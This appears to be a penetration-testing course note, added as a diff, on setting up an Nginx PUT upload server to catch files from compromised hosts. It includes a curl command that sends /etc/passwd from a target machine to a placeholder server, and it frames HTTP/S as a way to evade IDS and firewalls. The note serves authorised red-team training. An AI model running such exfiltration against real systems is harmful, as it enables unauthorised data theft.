@@ -1,0 +1,206 @@
+
+
+# Catching Files over HTTP/S
+
+## Why HTTP/S is Preferred
+
+HTTP and HTTPS are the most commonly allowed outbound protocols in enterprise networks. They blend into normal traffic, are less likely to be blocked by firewalls, and when HTTPS is used, data is encrypted in transit.
+
+From a penetration testing perspective, transferring sensitive data over plaintext protocols can trigger IDS alerts and create serious issues with the client. Therefore, HTTP/S is the safest and most professional approach for file transfers.
+
+---
+
+## Objective
+
+Create a secure server that:
+
+* Accepts file uploads
+* Uses HTTP or HTTPS
+* Does not execute uploaded files
+* Does not allow directory listing
+* Minimizes misconfiguration risks
+
+For this purpose, **Nginx with HTTP PUT** is preferred over Apache.
+
+---
+
+## Why Nginx Instead of Apache
+
+Apache:
+
+* Easily misconfigured
+* PHP execution is often enabled
+* Directory listing is commonly exposed
+
+Nginx:
+
+* Minimal by default
+* No file execution unless explicitly configured
+* No directory listing unless enabled
+
+This reduces the risk of accidentally enabling web shells.
+
+---
+
+# Configuring Nginx for File Uploads
+
+## Step 1: Create Upload Directory
+
+```bash
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+```
+
+Use a non-guessable directory name to reduce discovery risk.
+
+---
+
+## Step 2: Set Directory Ownership
+
+```bash
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+This allows Nginx to write uploaded files.
+
+---
+
+## Step 3: Create Nginx Configuration
+
+Create the file:
+
+```
+/etc/nginx/sites-available/upload.conf
+```
+
+Add the following:
+
+```nginx
+server {
+    listen 9001;
+
+    location /SecretUploadDirectory/ {
+        root /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+### Configuration Behavior
+
+* Listens on port 9001
+* Allows file uploads via PUT
+* No GET browsing
+* No script execution
+
+---
+
+## Step 4: Enable the Site
+
+```bash
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+```
+
+---
+
+## Step 5: Resolve Port Conflicts
+
+On systems like Pwnbox, port 80 may already be in use.
+
+Remove the default site:
+
+```bash
+sudo rm /etc/nginx/sites-enabled/default
+```
+
+Check active listeners:
+
+```bash
+ss -lnpt
+```
+
+---
+
+## Step 6: Restart Nginx
+
+```bash
+sudo systemctl restart nginx
+```
+
+If errors occur:
+
+```bash
+tail /var/log/nginx/error.log
+```
+
+---
+
+# Uploading Files Using cURL
+
+From the target machine or pivot host:
+
+```bash
+curl -T /etc/passwd http://<SERVER-IP>:9001/SecretUploadDirectory/users.txt
+```
+
+Verify upload:
+
+```bash
+tail /var/www/uploads/SecretUploadDirectory/users.txt
+```
+
+---
+
+## Security Validation Checks
+
+### Directory Listing
+
+Visiting:
+
+```
+http://<SERVER-IP>:9001/SecretUploadDirectory/
+```
+
+Should return **403 or 404**, not a file list.
+
+---
+
+### File Execution
+
+Uploading files such as `shell.php` should never result in execution, even if accessed via browser.
+
+---
+
+## Best Practices During Engagements
+
+### Recommended
+
+* Prefer HTTPS when possible
+* Encrypt files before upload if sensitive
+* Use obscure paths
+* Clean up all artifacts after testing
+
+### Avoid
+
+* Generic upload paths
+* Enabling PHP or CGI
+* Enabling autoindex
+* Reusing upload servers across engagements
+
+---
+
+## When This Method Is Useful
+
+* Data exfiltration simulations
+* DLP testing
+* Internal network pivoting
+* IDS-safe file transfers
+* Red team operations
+
+---
+
+## Key Takeaway
+
+HTTP/S provides camouflage, Nginx provides control, and encryption ensures professionalism.
+File transfer is not just about movement—it is about responsibility and operational security.
+
+---
